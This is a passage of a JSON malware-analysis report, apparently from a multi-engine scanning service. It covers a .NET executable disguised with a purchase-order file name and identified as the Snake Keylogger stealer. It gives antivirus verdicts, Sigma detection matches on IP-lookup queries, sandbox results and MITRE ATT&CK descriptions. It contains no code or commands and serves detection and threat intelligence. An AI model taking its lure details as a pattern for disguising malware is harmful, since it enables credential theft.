          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "CMC": {
          "method": "blacklist",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "engine_update": "20240129",
          "category": "undetected",
          "result": null
        },
        "CAT-QuickHeal": {
          "method": "blacklist",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "engine_update": "20240130",
          "category": "undetected",
          "result": null
        },
        "Skyhigh": {
          "method": "blacklist",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "BehavesLike.Win32.Generic.jc"
        },
        "McAfee": {
          "method": "blacklist",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Artemis!8E94412B2DFF"
        },
        "Malwarebytes": {
          "method": "blacklist",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.MalPack.PNG.Generic"
        },
        "Sangfor": {
          "method": "blacklist",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "engine_update": "20240129",
          "category": "malicious",
          "result": "Spyware.Msil.Snakelogger.Vove"
        },
        "K7AntiVirus": {
          "method": "blacklist",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.139.50917",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Alibaba": {
          "method": "blacklist",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "engine_update": "20190527",
          "category": "undetected",
          "result": null
        },
        "K7GW": {
          "method": "blacklist",
          "engine_name": "K7GW",
          "engine_version": "12.139.50919",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Cybereason": {
          "method": "blacklist",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "engine_update": "20231102",
          "category": "undetected",
          "result": null
        },
        "BitDefenderTheta": {
          "method": "blacklist",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "engine_update": "20240103",
          "category": "undetected",
          "result": null
        },
        "VirIT": {
          "method": "blacklist",
          "engine_name": "VirIT",
          "engine_version": "9.5.630",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Win32.MSIL_Heur.A"
        },
        "Symantec": {
          "method": "blacklist",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Scr.Malcode!gdn33"
        },
        "Elastic": {
          "method": "blacklist",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "engine_update": "20240115",
          "category": "malicious",
          "result": "malicious (high confidence)"
        },
        "ESET-NOD32": {
          "method": "blacklist",
          "engine_name": "ESET-NOD32",
          "engine_version": "28660",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "a variant of MSIL/Kryptik.AKTS"
        },
        "Zoner": {
          "method": "blacklist",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "APEX": {
          "method": "blacklist",
          "engine_name": "APEX",
          "engine_version": "6.495",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Malicious"
        },
        "Paloalto": {
          "method": "blacklist",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Cynet": {
          "method": "blacklist",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.29",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Malicious (score: 100)"
        },
        "Kaspersky": {
          "method": "blacklist",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "HEUR:Trojan-Spy.MSIL.SnakeLogger.gen"
        },
        "BitDefender": {
          "method": "blacklist",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Gen:Variant.MSILHeracles.143648"
        },
        "NANO-Antivirus": {
          "method": "blacklist",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "SUPERAntiSpyware": {
          "method": "blacklist",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Avast": {
          "method": "blacklist",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Win32:CrypterX-gen [Trj]"
        },
        "Tencent": {
          "method": "blacklist",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "TACHYON": {
          "method": "blacklist",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-31.02",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Emsisoft": {
          "method": "blacklist",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Gen:Variant.MSILHeracles.143648 (B)"
        },
        "F-Secure": {
          "method": "blacklist",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.TR/AD.SnakeStealer.lawkr"
        },
        "Baidu": {
          "method": "blacklist",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "engine_update": "20190318",
          "category": "undetected",
          "result": null
        },
        "Zillya": {
          "method": "blacklist",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5042",
          "engine_update": "20240130",
          "category": "undetected",
          "result": null
        },
        "TrendMicro": {
          "method": "blacklist",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Trapmine": {
          "method": "blacklist",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.97",
          "engine_update": "20231106",
          "category": "malicious",
          "result": "malicious.high.ml.score"
        },
        "FireEye": {
          "method": "blacklist",
          "engine_name": "FireEye",
          "engine_version": "35.47.0.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Generic.mg.8e94412b2dffeae1"
        },
        "Sophos": {
          "method": "blacklist",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Troj/Krypt-ABH"
        },
        "Ikarus": {
          "method": "blacklist",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.MSIL.Inject"
        },
        "GData": {
          "method": "blacklist",
          "engine_name": "GData",
          "engine_version": "A:25.37269B:27.34760",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "MSIL.Trojan-Spy.Snake.LB4IWD"
        },
        "Jiangmin": {
          "method": "blacklist",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "engine_update": "20240130",
          "category": "undetected",
          "result": null
        },
        "Webroot": {
          "method": "blacklist",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "W32.Trojan.Gen"
        },
        "Google": {
          "method": "blacklist",
          "engine_name": "Google",
          "engine_version": "1706704258",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Detected"
        },
        "Avira": {
          "method": "blacklist",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "TR/AD.SnakeStealer.lawkr"
        },
        "Antiy-AVL": {
          "method": "blacklist",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan[Spy]/MSIL.SnakeLogger"
        },
        "Kingsoft": {
          "method": "blacklist",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "engine_update": "20230906",
          "category": "malicious",
          "result": "malware.kb.c.737"
        },
        "Gridinsoft": {
          "method": "blacklist",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.158.174",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Xcitium": {
          "method": "blacklist",
          "engine_name": "Xcitium",
          "engine_version": "36395",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Arcabit": {
          "method": "blacklist",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.MSILHeracles.D23120"
        },
        "ViRobot": {
          "method": "blacklist",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "ZoneAlarm": {
          "method": "blacklist",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "HEUR:Trojan-Spy.MSIL.SnakeLogger.gen"
        },
        "Microsoft": {
          "method": "blacklist",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan:MSIL/SnakeKeylogger.SPZZ!MTB"
        },
        "Varist": {
          "method": "blacklist",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "W32/MSIL_Agent.HKT.gen!Eldorado"
        },
        "AhnLab-V3": {
          "method": "blacklist",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan/Win.CrypterX-gen.R633277"
        },
        "Acronis": {
          "method": "blacklist",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "engine_update": "20230828",
          "category": "undetected",
          "result": null
        },
        "VBA32": {
          "method": "blacklist",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "ALYac": {
          "method": "blacklist",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.8",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "MAX": {
          "method": "blacklist",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "malware (ai score=89)"
        },
        "Cylance": {
          "method": "blacklist",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "engine_update": "20240103",
          "category": "malicious",
          "result": "unsafe"
        },
        "Panda": {
          "method": "blacklist",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trj/Chgt.AD"
        },
        "TrendMicro-HouseCall": {
          "method": "blacklist",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "TROJ_GEN.F0D1C00AU24"
        },
        "Rising": {
          "method": "blacklist",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Spyware.SnakeLogger!8.15FDD (CLOUD)"
        },
        "Yandex": {
          "method": "blacklist",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Igent.b1ERuz.15"
        },
        "SentinelOne": {
          "method": "blacklist",
          "engine_name": "SentinelOne",
          "engine_version": "24.1.0.5",
          "engine_update": "20240129",
          "category": "malicious",
          "result": "Static AI - Malicious PE"
        },
        "MaxSecure": {
          "method": "blacklist",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Malware.300983.susgen"
        },
        "Fortinet": {
          "method": "blacklist",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "MSIL/Stealer.36680!tr"
        },
        "AVG": {
          "method": "blacklist",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Win32:CrypterX-gen [Trj]"
        },
        "DeepInstinct": {
          "method": "blacklist",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "MALICIOUS"
        },
        "CrowdStrike": {
          "method": "blacklist",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "engine_update": "20231026",
          "category": "malicious",
          "result": "win/malicious_confidence_100% (W)"
        },
        "VIPRE": {
          "method": "blacklist",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "engine_update": "20240131",
          "category": "failure",
          "result": null
        },
        "Avast-Mobile": {
          "method": "blacklist",
          "engine_name": "Avast-Mobile",
          "engine_version": "240131-00",
          "engine_update": "20240131",
          "category": "type-unsupported",
          "result": null
        },
        "SymantecMobileInsight": {
          "method": "blacklist",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "engine_update": "20240103",
          "category": "type-unsupported",
          "result": null
        },
        "BitDefenderFalx": {
          "method": "blacklist",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "engine_update": "20240128",
          "category": "type-unsupported",
          "result": null
        },
        "Trustlook": {
          "method": "blacklist",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "engine_update": "20240131",
          "category": "type-unsupported",
          "result": null
        }
      },
      "sha1": "e26c12105aaf9c2e35647dc4e7e400812144f1e4",
      "meaningful_name": "DrGC.exe",
      "total_votes": {
        "harmless": 0,
        "malicious": 2
      },
      "sigma_analysis_results": [
        {
          "match_context": [
            {
              "values": {
                "query": "checkip.dyndns.org"
              }
            },
            {
              "values": {
                "EventID": "22",
                "QueryStatus": "0",
                "Image": "C:\\Users\\george\\Desktop\\software.exe",
                "QueryName": "checkip.dyndns.org",
                "QueryResults": "type:  5 checkip.dyndns.com;::ffff:193.122.6.168;::ffff:158.101.44.242;::ffff:193.122.130.0;::ffff:132.226.247.73;::ffff:132.226.8.169;"
              }
            },
            {
              "values": {
                "EventID": "22",
                "QueryStatus": "0",
                "QueryResults": "type:  5 checkip.dyndns.com;::ffff:158.101.44.242;::ffff:193.122.130.0;::ffff:132.226.8.169;::ffff:132.226.247.73;::ffff:193.122.6.168;",
                "QueryName": "checkip.dyndns.org",
                "Image": "C:\\Users\\george\\Desktop\\software.exe"
              }
            },
            {
              "values": {
                "EventID": "22",
                "QueryStatus": "0",
                "Image": "C:\\Users\\george\\Desktop\\software.exe",
                "QueryName": "checkip.dyndns.org",
                "QueryResults": "type:  5 checkip.dyndns.com;::ffff:193.122.6.168;::ffff:132.226.8.169;::ffff:132.226.247.73;::ffff:158.101.44.242;::ffff:193.122.130.0;"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "3a2766a08d32a855b604a786cddc0f76fee13e6ccd22e01d4878150f0ef1eebc",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Suspicious DNS Query for IP Lookup Service APIs",
          "rule_description": "Detects DNS queries for IP lookup services such as \"api.ipify.org\" originating from a non browser process.",
          "rule_author": "Brandon George (blog post), Thomas Patzke"
        },
        {
          "match_context": [
            {
              "values": {
                "DestinationHostname": "checkip.dyndns.org",
                "Initiated": "true",
                "DestinationPort": "80",
                "DestinationIp": "193.122.130.0"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "7b06f86400ae084ca05c7e2cefe70b8ea4910b6196d969ae516b9d5d1c99bfe5",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Suspicious Network Connection to IP Lookup Service APIs",
          "rule_description": "Detects external IP address lookups by non-browser processes via services such as \"api.ipify.org\". This could be indicative of potential post compromise internet test activity.",
          "rule_author": "Janantha Marasinghe, Nasreddine Bencherchali (Nextron Systems)"
        }
      ],
      "last_analysis_stats": {
        "malicious": 46,
        "suspicious": 0,
        "undetected": 25,
        "harmless": 0,
        "timeout": 0,
        "confirmed-timeout": 0,
        "failure": 1,
        "type-unsupported": 4
      },
      "times_submitted": 7,
      "pe_info": {
        "timestamp": 1706579165,
        "imphash": "f34d5f2d4577ed6d9ceec516c1f5a744",
        "machine_type": 332,
        "entry_point": 629830,
        "resource_details": [
          {
            "lang": "NEUTRAL",
            "chi2": 549.74,
            "filetype": "PNG",
            "entropy": 7.961813926696777,
            "sha256": "27298ce178ed439f5d26f13d91ea84defa3914071dad51646e72e528d1b5b2a8",
            "type": "RT_ICON"
          },
          {
            "lang": "NEUTRAL",
            "chi2": 2386.4,
            "filetype": "ICO",
            "entropy": 1.5166423320770264,
            "sha256": "fe081199d40760c06b39b5f3bb98063bf4d1d6a172262fbaf414157f1ca63022",
            "type": "RT_GROUP_ICON"
          },
          {
            "lang": "NEUTRAL",
            "chi2": 76301.39,
            "filetype": "unknown",
            "entropy": 3.3594138622283936,
            "sha256": "4275b094ffbbed03bc96d882df1975e00626106a8ee66bb55d617b76df7b4e77",
            "type": "RT_VERSION"
          }
        ],
        "resource_langs": {
          "NEUTRAL": 3
        },
        "resource_types": {
          "RT_ICON": 1,
          "RT_VERSION": 1,
          "RT_GROUP_ICON": 1
        },
        "sections": [
          {
            "name": ".text",
            "chi2": 169212,
            "virtual_address": 8192,
            "flags": "rx",
            "raw_size": 622080,
            "entropy": 7.91,
            "virtual_size": 621828,
            "md5": "9a55eff9ca94150df42f632d41a06ce0"
          },
          {
            "name": ".rsrc",
            "chi2": 22093.09,
            "virtual_address": 630784,
            "flags": "r",
            "raw_size": 11264,
            "entropy": 7.67,
            "virtual_size": 11068,
            "md5": "802f93f2c2704d9f2f34afc1fc000bf4"
          },
          {
            "name": ".reloc",
            "chi2": 128015,
            "virtual_address": 647168,
            "flags": "r",
            "raw_size": 512,
            "entropy": 0.1,
            "virtual_size": 12,
            "md5": "dbea1a8d3e09582555ec6b2230bd03e7"
          }
        ],
        "import_list": [
          {
            "library_name": "mscoree.dll",
            "imported_functions": [
              "_CorExeMain"
            ]
          }
        ]
      },
      "names": [
        "c7362845283503e1538fd1c4ba224becc55c213613c30684fa790cd6f99d2094.exe",
        "DrGC.exe",
        "SIPARIS-290124 (619 KB).exe"
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 0,
          "medium": 2,
          "critical": 0,
          "low": 0
        }
      },
      "signature_info": {
        "product": "Andrewsy Lib",
        "description": "AndrewsyLib",
        "file version": "1.2.0.0",
        "original name": "DrGC.exe",
        "comments": "WordProcessorChamberlin",
        "internal name": "DrGC.exe",
        "copyright": "WordProcessorChamberlin 1994"
      },
      "first_submission_date": 1706582371,
      "dot_net_assembly": {
        "entry_point_token": 100663432,
        "metadata_header_rva": 31592,
        "assembly_name": "DrGC.exe",
        "resources_va": 562920,
        "assembly_flags": 3,
        "strongname_va": 0,
        "external_assemblies": {
          "System.Data": {
            "version": "4.0.0.0"
          },
          "mscorlib": {
            "version": "4.0.0.0"
          },
          "System": {
            "version": "4.0.0.0"
          },
          "System.Drawing": {
            "version": "4.0.0.0"
          },
          "System.Windows.Forms": {
            "version": "4.0.0.0"
          },
          "System.Core": {
            "version": "4.0.0.0"
          }
        },
        "entry_point_rva": 66828,
        "tables_rows_map": "1ba2c0cf01440132216f1c850120346013d0296c00b0b0010060000b90d0",
        "manifest_resource": [
          "Andrewsy.Lib.WinForm.Controls.Animation.AnimateForm.resources",
          "Andrewsy.Lib.WinForm.Controls.Animation.BaseForm.resources",
          "Andrewsy.Lib.WinForm.Controls.Animation.FadeForm.resources",
          "Andrewsy.Lib.WinForm.Controls.Animation.PromptDialog.resources",
          "Andrewsy.Lib.WinForm.Controls.Animation.SlideForm.resources",
          "Andrewsy.Lib.WinForm.Controls.ExtControl.SearchBox.resources",
          "Andrewsy.Lib.WinForm.Controls.Properties.Resources.resources",
          "Andrewsy.Lib.WinForm.Controls.Resource.resources",
          "RsMgInfoSys.WinForm.Controls.SelfDefine.DataViewer.resources",
          "WordProcessorChamberlin.ChildEditor.resources",
          "WordProcessorChamberlin.Form1.resources"
        ],
        "streams": {
          "#~": {
            "chi2": 406974.75,
            "size": 14320,
            "entropy": 5.5782647132873535,
            "md5": "36e72b4427a0556a007959a0c835ebde"
          },
          "#Strings": {
            "chi2": 127851.65625,
            "size": 12884,
            "entropy": 5.074951648712158,
            "md5": "275df4db232e02143df45e9311fd19b6"
          },
          "#US": {
            "chi2": 219725.828125,
            "size": 3892,
            "entropy": 4.066209316253662,
            "md5": "3107f8c5ebd0228691ec2ed2d9ce80c4"
          },
          "#GUID": {
            "chi2": 240,
            "size": 16,
            "entropy": 4,
            "md5": "355481188ae74d8e4a9825f3db5d3f99"
          },
          "#Blob": {
            "chi2": 26338.6640625,
            "size": 4016,
            "entropy": 6.015323162078857,
            "md5": "f92d46c76e72ab5f60799c2720b51d5c"
          }
        },
        "tables_present": 25,
        "assembly_flags_txt": "COMIMAGE_FLAGS_ILONLY, COMIMAGE_FLAGS_32BITREQUIRED",
        "assembly_data": {
          "majorversion": 3,
          "minorversion": 0,
          "hashalgid": 32772,
          "flags_text": "afPA_None",
          "buildnumber": 1,
          "flags": 0,
          "revisionnumber": 0,
          "name": "DrGC"
        },
        "clr_version": "v4.0.30319",
        "clr_meta_version": "1.1",
        "tables_present_map": "b0929b6df57",
        "tables_rows_map_log": "4979994a79448576786645666",
        "type_definition_list": [
          {
            "namespace": "System.Runtime.InteropServices",
            "type_definitions": [
              "ComVisibleAttribute",
              "GuidAttribute"
            ]
          },
          {
            "namespace": "System",
            "type_definitions": [
              "EventHandler",
              "Object",
              "IDisposable",
              "EventArgs",
              "Func`2",
              "Type",
              "IAsyncResult",
              "Exception",
              "MulticastDelegate",
              "AsyncCallback",
              "Enum",
              "STAThreadAttribute",
              "ValueType",
              "Delegate",
              "Int32",
              "Convert",
              "String",
              "Action",
              "Array",
              "RuntimeFieldHandle",
              "RuntimeTypeHandle",
              "Byte",
              "Char",
              "Single",
              "Math",
              "Boolean",
              "NotImplementedException"
            ]
          },
          {
            "namespace": "System.Security",
            "type_definitions": [
              "UnverifiableCodeAttribute"
            ]
          },
          {
            "namespace": "System.Reflection",
            "type_definitions": [
              "AssemblyTitleAttribute",
              "AssemblyDescriptionAttribute",
              "AssemblyConfigurationAttribute",
              "AssemblyCompanyAttribute",
              "AssemblyProductAttribute",
              "AssemblyCopyrightAttribute",
              "AssemblyTrademarkAttribute",
              "AssemblyFileVersionAttribute",
              "BindingFlags",
              "Binder",
              "Assembly"
            ]
          },
          {
            "namespace": "System.Linq",
            "type_definitions": [
              "Enumerable",
              "IOrderedEnumerable`1"
            ]
          },
          {
            "namespace": "System.CodeDom.Compiler",
            "type_definitions": [
              "GeneratedCodeAttribute"
            ]
          },
          {
            "namespace": "System.Runtime.Remoting.Messaging",
            "type_definitions": [
              "AsyncResult"
            ]
          },
          {
            "namespace": "System.Resources",
            "type_definitions": [
              "NeutralResourcesLanguageAttribute",
              "ResourceManager"
            ]
          },
          {
            "namespace": "System.Windows.Forms.VisualStyles",
            "type_definitions": [
              "CheckBoxState"
            ]
          },
          {
            "namespace": "uncategorized",
            "type_definitions": [
              "DebuggingModes",
              "ListViewSubItem",
              "ListViewSubItemCollection",
              "ListViewItemCollection",
              "ColumnHeaderCollection",
              "SelectedIndexCollection",
              "ControlCollection",
              "ImageCollection",
              "ObjectCollection"
            ]
          },
          {
            "namespace": "System.Data",
            "type_definitions": [
              "DataTable",
              "DataRow",
              "DataColumn",
              "DataColumnCollection",
              "InternalDataCollectionBase",
              "DataRowCollection"
            ]
          },
          {
            "namespace": "System.Runtime.CompilerServices",
            "type_definitions": [
              "ExtensionAttribute",
              "CompilationRelaxationsAttribute",
              "RuntimeCompatibilityAttribute",
              "CompilerGeneratedAttribute",
              "RuntimeHelpers"
            ]
          },
          {
            "namespace": "System.Threading",
            "type_definitions": [
              "ThreadAbortException",
              "Thread",
              "Interlocked"
            ]
          },
          {
            "namespace": "System.Security.Permissions",
            "type_definitions": [
              "SecurityAction",
              "SecurityPermissionAttribute"
            ]
          },
          {
            "namespace": "System.Runtime.Versioning",
            "type_definitions": [
              "TargetFrameworkAttribute"
            ]
          },
          {
            "namespace": "System.Drawing.Drawing2D",
            "type_definitions": [
              "LinearGradientMode",
              "LinearGradientBrush",
              "ColorBlend"
            ]
          },
          {
            "namespace": "System.Globalization",
            "type_definitions": [
              "CultureInfo"
            ]
          },
          {
            "namespace": "System.Windows.Forms.Layout",
            "type_definitions": [
              "ArrangedElementCollection"
            ]
          },
          {
            "namespace": "System.Diagnostics",
            "type_definitions": [
              "DebuggableAttribute",
              "DebuggerNonUserCodeAttribute"
            ]
          },
          {
            "namespace": "System.Collections",
            "type_definitions": [
              "IEnumerator",
              "IComparer"
            ]
          },
          {
            "namespace": "System.Drawing",
            "type_definitions": [
              "Color",
              "Bitmap",
              "Rectangle",
              "Graphics",
              "SolidBrush",
              "Image",
              "Point",
              "Pen",
              "Size",
              "SizeF",
              "Font",
              "FontStyle",
              "GraphicsUnit",
              "Icon",
              "Brush",
              "IDeviceContext"
            ]
          },
          {
            "namespace": "System.ComponentModel",
            "type_definitions": [
              "IContainer",
              "ComponentResourceManager",
              "EditorBrowsableState",
              "EditorBrowsableAttribute",
              "DescriptionAttribute",
              "CategoryAttribute",
              "DefaultValueAttribute",
              "BrowsableAttribute",
              "Container",
              "CancelEventArgs"
            ]
          },
          {
            "namespace": "System.Windows.Forms",
            "type_definitions": [
              "UserControl",
              "StatusStrip",
              "ToolStripStatusLabel",
              "ToolStripProgressBar",
              "ToolStrip",
              "ToolStripLabel",
              "ToolStripButton",
              "ToolStripTextBox",
              "ListView",
              "ListViewItem",
              "ColumnHeader",
              "KeyEventArgs",
              "Form",
              "ToolStripMenuItem",
              "Timer",
              "RichTextBox",
              "FormClosedEventArgs",
              "HorizontalAlignment",
              "MenuStrip",
              "ToolStripSeparator",
              "ContainerControl",
              "DrawListViewColumnHeaderEventArgs",
              "DrawListViewItemEventArgs",
              "DrawListViewSubItemEventArgs",
              "TextFormatFlags",
              "Control",
              "TextBox",
              "ListBox",
              "TreeView",
              "TreeNode",
              "TreeNodeCollection",
              "PaintEventArgs",
              "MouseEventArgs",
              "TreeViewHitTestInfo",
              "Panel",
              "FormClosingEventArgs",
              "ControlStyles",
              "ToolStripItem",
              "MessageBox",
              "DialogResult",
              "Keys",
              "MessageBoxButtons",
              "MessageBoxIcon",
              "ToolStripItemCollection",
              "ToolStripItemDisplayStyle",
              "BorderStyle",
              "KeyEventHandler",
              "ToolStripControlHost",
              "ToolStripItemAlignment",
              "Padding",
              "DockStyle",
              "View",
              "AutoScaleMode",
              "FormClosedEventHandler",
              "TextBoxBase",
              "RightToLeft",
              "ToolStripDropDownItem",
              "ToolStripDropDown",
              "Application",
              "CheckState",
              "FormBorderStyle",
              "ListViewItemStates",
              "CheckBoxRenderer",
              "ImageList",
              "TextRenderer",
              "ListControl",
              "MouseButtons",
              "TreeViewHitTestLocations",
              "FormStartPosition",
              "FormClosingEventHandler",
              "CloseReason"
            ]
          },
          {
            "namespace": "System.Collections.Generic",
            "type_definitions": [
              "IEnumerator`1",
              "Dictionary`2",
              "IList`1",
              "IEnumerable`1",
              "ICollection`1",
              "List`1"
            ]
          }
        ]
      },
      "tags": [
        "peexe",
        "assembly",
        "detect-debug-environment",
        "long-sleeps",
        "checks-user-input",
        "spreader"
      ],
      "size": 634368,
      "last_submission_date": 1706713617,
      "tlsh": "T1F3D4121837980967C9AD89B8CC6112DC4372AE267E46D38F1CC830AE5EF378757D6663",
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "malicious",
          "confidence": 80,
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "MALWARE",
            "STEALER",
            "TROJAN",
            "EVADER"
          ],
          "malware_names": [
            "Snake Keylogger"
          ]
        }
      },
      "type_description": "Win32 EXE",
      "last_analysis_date": 1706713617,
      "creation_date": 1706579165
    }
  },
  "mitre": {
    "data": {
      "CAPE Sandbox": {
        "tactics": [
          {
            "id": "TA0011",
            "name": "Command and Control",
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "id": "T1071",
                "name": "Application Layer Protocol",
                "link": "https://attack.mitre.org/techniques/T1071/",
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic."
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0002",
            "name": "Execution",
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "id": "T1106",
                "name": "Native API",
                "link": "https://attack.mitre.org/techniques/T1106/",
